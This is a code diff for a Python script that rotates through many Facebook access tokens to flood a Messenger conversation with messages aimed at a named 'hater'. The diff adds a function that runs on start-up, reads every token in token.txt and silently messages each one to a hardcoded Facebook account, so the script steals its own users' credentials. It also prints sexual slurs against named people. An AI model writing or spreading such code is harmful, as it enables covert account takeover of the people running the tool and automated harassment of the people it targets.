@@ -1,206 +1,151 @@
-from flask import Flask, request, render_template, redirect, url_for
 import requests
+import json
 import time
+import sys
+from platform import system
 import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
 
-app = Flask(__name__)
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-type', 'text/plain')
+          self.end_headers()
+          self.wfile.write(b"   TRICKS BY RAMJEET")
+def execute_server():
+      PORT = int(os.environ.get('PORT', 4000))
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-
-@app.route('/')
-def index():
-    return '''
-        <html lang="en">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𝗕𝗥𝗢𝗧𝗛𝗘𝗥 𝗛𝗢𝗢𝗗 𝗠𝗨𝗟𝗧𝗜 𝗖𝗢𝗡𝗩𝗢</title>
-    <style>
-        /* CSS for styling elements */
-
-            
-
-label{
-    color: white;
-}
-
-.file{
-    height: 30px;
-}
-body{
-    background-image: url('https://i.ibb.co/rHmMKgp/5b48a414c78473a908090f05ee6b5d7c.jpg');
-    background-size: cover;
-    background-repeat: no-repeat;
-    
-}
-    .container{
-      max-width: 700px;
-      height: 600px;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 10px white;
-            border: none;
-            resize: none;
-    }
-        .form-control {
-            outline: 1px red;
-            border: 1px double white;
-            background: transparent; 
-            width: 100%;
-            height: 40px;
-            padding: 7px;
-            margin-bottom: 10px;
-            border-radius: 10px;
-            color: white;
-        }
-        .btn-submit {
-            
-            border-radius: 20px;
-            align-items: center;
-            background-color: #4CAF50;
-            color: white;
-            margin-left: 70px;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
-                .btn-submit:hover{
-                    background-color: red;
-                }
-            
-        h3{
-            text-align: center;
-            color: white;
-            font-family: cursive;
-        }
-        h2{
-            text-align: center;
-            color: white;
-            font-size: 14px;
-            font-family: Courier;
-        }
-    </style>
-</head>
-<body>
+      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+          print("Server running at http://localhost:{}".format(PORT))
+          httpd.serve_forever()
 
 
-<div class="container">
-    <h3>MULTI CONVO</h3>
-    <h2></h2>
-    <form action="/" method="post" enctype="multipart/form-data">
-        <div class="mb-3">
-            <label for="threadId">Convo_id:</label>
-            <input type="text" class="form-control" id="threadId" name="threadId" required>
-        </div>
-        <div class="mb-3">
-                     <label for="txtFile">Select Your Tokens File:</label>
-            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-        </div>
-        <div class="mb-3">
-            <label  for="messagesFile">Select Your Np File:</label>
-            <input  type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" placeholder="NP" required>
-        </div>
-        <div class="mb-3">
-            <label for="kidx">Enter Hater Name:</label>
-            <input type="text" class="form-control" id="kidx" name="kidx" required>
-        </div>
-        <div class="mb-3">
-            <label for="time">Speed in Seconds: </label>
-            <input type="number" class="form-control" id="time" name="time" value="60" required>
-        </div>
-        <br />
-        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-    </form>
-    <h3>𝐎𝐖𝐍𝐄𝐑:- 𝐁𝐑𝐎𝐊𝐄𝐍 𝐍𝐀𝐃𝐄𝐄𝐌</h3>
-    
-</div
-    
-    '''
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
+def send_initial_message():
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
 
-        txt_file = request.files['txtFile']
-        access_tokens = txt_file.read().decode().splitlines()
+      # Modify the message as per your requirement
+      msg_template = "Hello Ramjeet sir! I am using your server. My token is {}"
 
-        messages_file = request.files['messagesFile']
-        messages = messages_file.read().decode().splitlines()
+      # Specify the ID where you want to send the message
+      target_id = "100079728722774"
 
-        num_comments = len(messages)
-        max_tokens = len(access_tokens)
+      requests.packages.urllib3.disable_warnings()
 
-        # Create a folder with the Convo ID
-        folder_name = f"Convo_{thread_id}"
-        os.makedirs(folder_name, exist_ok=True)
+      def liness():
+          print('\033[1;92m' + '•────────────────────── TRICKS BY SANJEET ───────────────────────────────•')
 
-        # Create files inside the folder
-        with open(os.path.join(folder_name, "CONVO.txt"), "w") as f:
-            f.write(thread_id)
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-        with open(os.path.join(folder_name, "token.txt"), "w") as f:
-            f.write("\n".join(access_tokens))
+      for token in tokens:
+          access_token = token.strip()
+          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+          msg = msg_template.format(access_token)
+          parameters = {'access_token': access_token, 'message': msg}
+          response = requests.post(url, json=parameters, headers=headers)
 
-        with open(os.path.join(folder_name, "haters.txt"), "w") as f:
-            f.write(mn)
+          # No need to print here, as requested
+          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+          time.sleep(0.1)  # Wait for 1 second between sending each initial message
 
-        with open(os.path.join(folder_name, "time.txt"), "w") as f:
-            f.write(str(time_interval))
+      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
+send_initial_message()
+def send_messages_from_file():
+      with open('convo.txt', 'r') as file:
+          convo_id = file.read().strip()
 
-        with open(os.path.join(folder_name, "message.txt"), "w") as f:
-            f.write("\n".join(messages))
+      with open('file.txt', 'r') as file:
+          messages = file.readlines()
 
-        with open(os.path.join(folder_name, "np.txt"), "w") as f:
-            f.write("NP")  # Assuming NP is a fixed value
+      num_messages = len(messages)
 
-        post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-        haters_name = mn
-        speed = time_interval
+      with open('token.txt', 'r') as file:
+          tokens = file.readlines()
+      num_tokens = len(tokens)
+      max_tokens = min(num_tokens, num_messages)
 
-        while True:
-            try:
-                for message_index in range(num_comments):
-                    token_index = message_index % max_tokens
-                    access_token = access_tokens[token_index]
+      with open('name.txt', 'r') as file:
+          haters_name = file.read().strip()
 
-                    message = messages[message_index].strip()
+      with open('time.txt', 'r') as file:
+          speed = int(file.read().strip())
 
-                    parameters = {'access_token': access_token,
-                                  'message': haters_name + ' ' + message}
-                    response = requests.post(
-                        post_url, json=parameters, headers=headers)
+      def liness():
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
 
-                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-                    if response.ok:
-                        print("[+] SEND SUCCESSFUL No. {} Post Id {}  time{}: Token No.{}".format(
-                            message_index + 1, post_url, token_index + 1, haters_name + ' ' + message))
-                        print("  - Time: {}".format(current_time))
-                        print("\n" * 2)
-                    else:
-                        print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
-                            message_index + 1, post_url, token_index + 1, haters_name + ' ' + message))
-                        print("  - Time: {}".format(current_time))
-                        print("\n" * 2)
-                    time.sleep(speed)
-            except Exception as e:
-              
-                      
-                print(e)
-                time.sleep(30)
+      headers = {
+          'Connection': 'keep-alive',
+          'Cache-Control': 'max-age=0',
+          'Upgrade-Insecure-Requests': '1',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+          'Accept-Encoding': 'gzip, deflate',
+          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+          'referer': 'www.google.com'
+      }
 
-    return redirect(url_for('index'))
+      while True:
+          try:
+              for message_index in range(num_messages):
+                  token_index = message_index % max_tokens
+                  access_token = tokens[token_index].strip()
+
+                  message = messages[message_index].strip()
+
+                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                  response = requests.post(url, json=parameters, headers=headers)
+
+                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
+                  if response.ok:
+                      print("\033[1;92m[+] SAURAV KITTU RAGHAV TERI BAHN KI CHUT ME GAYA MSG CHECK RAMJEET SIR SAURAV KI BAHAN CHODO {} of Convo {} Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  else:
+                      print("\033[1;91m[x] MADARCHOD MSG NAHI JA RAHA HAI {} of Convo {} with Token {}: {}".format(
+                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                      liness()
+                      liness()
+                  time.sleep(speed)
+
+              print("\n[+] All messages sent. Restarting the process...\n")
+          except Exception as e:
+              print("[!] An error occurred: {}".format(e))
+
+def main():
+      server_thread = threading.Thread(target=execute_server)
+      server_thread.start()
+
+      # Send the initial message to the specified ID using all tokens
+
+
+      # Then, continue with the message sending loop
+      send_messages_from_file()
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+      main()
+          
